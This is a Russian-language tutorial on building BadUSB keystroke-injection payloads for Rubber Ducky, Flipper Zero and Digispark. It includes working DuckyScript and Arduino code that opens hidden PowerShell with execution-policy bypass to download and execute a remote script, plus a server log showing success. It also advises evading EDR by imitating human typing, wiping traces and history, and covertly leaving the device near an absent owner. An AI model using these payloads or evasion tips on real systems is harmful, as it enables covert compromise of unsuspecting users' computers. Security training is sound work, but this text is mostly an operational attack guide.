## Вопрос, с которого всё начинается

В уроке про BadUSB мы собрали простейший payload: открыть терминал и записать `whoami`. Но настоящий payload — это программа: он проверяет, какая ОС перед ним, ждёт загрузки нужного окна, повторяет действия и убирает за собой следы. На чём это писать и как сделать так, чтобы ввод не «рассыпался» на медленной машине?

Разберём это на одном payload'е, который должен сработать и на Windows, и учесть тайминги.

## Наш пример: payload, устойчивый к таймингам

Мы хотим, чтобы устройство открыло терминал и запустило слушатель на нашей машине — но без ошибок на медленном хосте. Возьмём этот сценарий и доведём его до рабочего DuckyScript 3.0 с переменными.

## Шаг 1: сравниваем платформы

Сначала — на чём вообще исполнять payload:

| Платформа | Язык | Плюсы | Минусы |
|-----------|------|-------|--------|
| Rubber Ducky (Hak5) | DuckyScript 3.0 | эталон, Payload Studio | цена, заметная «флешка» |
| Digispark ATtiny85 | Arduino C | дёшево, мал | мало памяти, тайминги |
| MalDuino | Arduino | open-source | устарела |
| Flipper Zero | DuckyScript + BadUSB | многофункционален | крупный, заметен |
| O.MG Cable | встроенный | неотличим от кабеля | цена |
| Bash Bunny (Hak5) | bash + HID | несколько режимов | крупнее Ducky |

Для «программируемого» payload'а с ветвлением лучше Rubber Ducky или Flipper. Для дешёвой одноразовой демонстрации — Digispark.

## Шаг 2: DuckyScript 1.0 против 3.0

DuckyScript 1.0 — линейный список команд. 3.0 добавил переменные, условия и подпрограммы — payload стал настоящей программой:

| Команда | 1.0 | 3.0 | Смысл |
|---------|-----|-----|-------|
| `STRING` | да | да | набрать текст |
| `DELAY` | да | да | пауза |
| `DEFAULT_DELAY` | да | да | глобальная задержка |
| `REPEAT` | да | да | повтор |
| `DEFINE` | нет | да | переменная/константа |
| `IF/ELSE/END_IF` | нет | да | ветвление |
| `FUNCTION/END_FUNCTION` | нет | да | подпрограмма |
| `WHILE/END_WHILE` | нет | да | цикл |

Наш payload использует `DEFINE`, чтобы вынести адрес сервера в одну строку:

```duckyscript
DEFINE #HOST 10.10.10.10
DEFAULT_DELAY 60
DELAY 3000
GUI r
DELAY 800
STRING powershell -w hidden -ep bypass -c "iwr http://#HOST/a.ps1|iex"
ENTER
```

`DEFINE #HOST` — это переменная; `#HOST` подставится в строку. `DEFAULT_DELAY 60` задаёт паузу 60 мс между всеми нажатиями — она и спасает от «рассыпания» на медленном хосте.

## Шаг 3: подбираем тайминги

Тайминг — главная тонкость HID-инъекции. Ориентиры:

| Фаза | Типичная задержка |
|------|-------------------|
| Пост-загрузка ОС | 5000–15000 мс |
| Открытие Run/Spotlight | 500–1500 мс |
| Запуск shell | 800–3000 мс |
| Ввод команды | `DEFAULT_DELAY 30–60` |

Правило: на незнакомой цели ставьте задержки **больше**, потом уменьшайте. Слишком быстрый ввод теряет символы; слишком медленный — пользователь успеет заметить.

## Шаг 4: компилируем и заливаем

Для Rubber Ducky payload компилируют в бинарный формат и кладут на microSD. Для Flipper — просто текстовый файл в `badusb/`. Для Digispark — скетч Arduino:

```cpp
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.print("powershell -w hidden -ep bypass -c \"iwr http://10.10.10.10/a.ps1|iex\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}
```

## Шаг 5: тестируем и замеряем

Прогоняем payload на своей виртуалке, где вместо реальной загрузки открыт текстовый редактор — видно, что именно набирается. Затем — на стенде с реальной целью и смотрим, пришёл ли запрос на наш сервер:

```
# На сервере 10.10.10.10 видим HTTP-запрос
10.10.10.20 - - [12/Oct/2026 14:22:01] "GET /a.ps1 HTTP/1.1" 200 -
```

Если запрос есть — payload дошёл целиком. Если обрезался — увеличиваем `DEFAULT_DELAY`.

## Шаг 6: обход простых защит

Что помогает против BadUSB:

| Защита | Эффективность против BadUSB |
|--------|------------------------------|
| Отключение автозапуска | нет |
| Whitelist по классу USB | частично |
| EDR с детекцией HID-тайминга | да |
| Физическая блокировка портов | да |
| Обучение пользователей | частично |

Обход — это уже не про железо, а про маскировку payload'а под легитимные действия. Мы разбираем это, чтобы понимать, **почему** whitelist по VID/PID не спасает: устройство подделывает и VID, и класс.

## Как это выглядит целиком

Соберём payload целиком: `DEFINE #HOST 10.10.10.10`, `DEFAULT_DELAY 60`, затем `GUI r`, пауза `800`, `STRING powershell ...`, `ENTER`. Заливаем на Ducky, вставляем в цель и ждём. На нашем сервере в логе появляется `GET /a.ps1 HTTP/1.1 200` — значит, ввод дошёл целиком. Если бы строка обрезалась, мы бы подняли `DEFAULT_DELAY` до 80–100 мс и повторили. Затем payload проверяет ОС, убирает temp-файл и историю — и следов почти не остаётся.

## На что смотреть дальше

- **Раскладка.** На системе с русским языком US-раскладка DuckyScript «поедет». Стройте payload из символов, совпадающих в обеих раскладках.
- **Спецклавиши.** `GUI r` = Win+R, `CTRL ALT t` = терминал в Linux, `GUI SPACE` = Spotlight в macOS.
- **Очистка следов.** Хороший payload убирает за собой temp-файлы и историю.
- **OPSEC доставки.** Не оставляйте устройство и не «звоните» громко; доставку планируйте отдельно.

## Если не сработало

- **Ввод «рассыпается».** Поднимите `DEFAULT_DELAY`; на медленном хосте 60 мс мало.
- **Открылось не то окно.** Увеличьте задержку после `GUI r` — система ещё грузится.
- **Раскладка не US.** Символы вроде `"` и `|` наберутся иначе — избегайте их или задайте раскладку.
- **EDR блокирует.** Сработала детекция аномальных таймингов — payload нужно маскировать под «человеческий» ввод.
- **Нет доступа к цели.** Устройство можно оставить, но доставку и время выбирайте так, чтобы хоста не было рядом с рабочим местом владельца.
- **Payload не запускается вовсе.** Проверьте в `dmesg`, что устройство определяется как HID, и что задержки хватает на загрузку ОС.
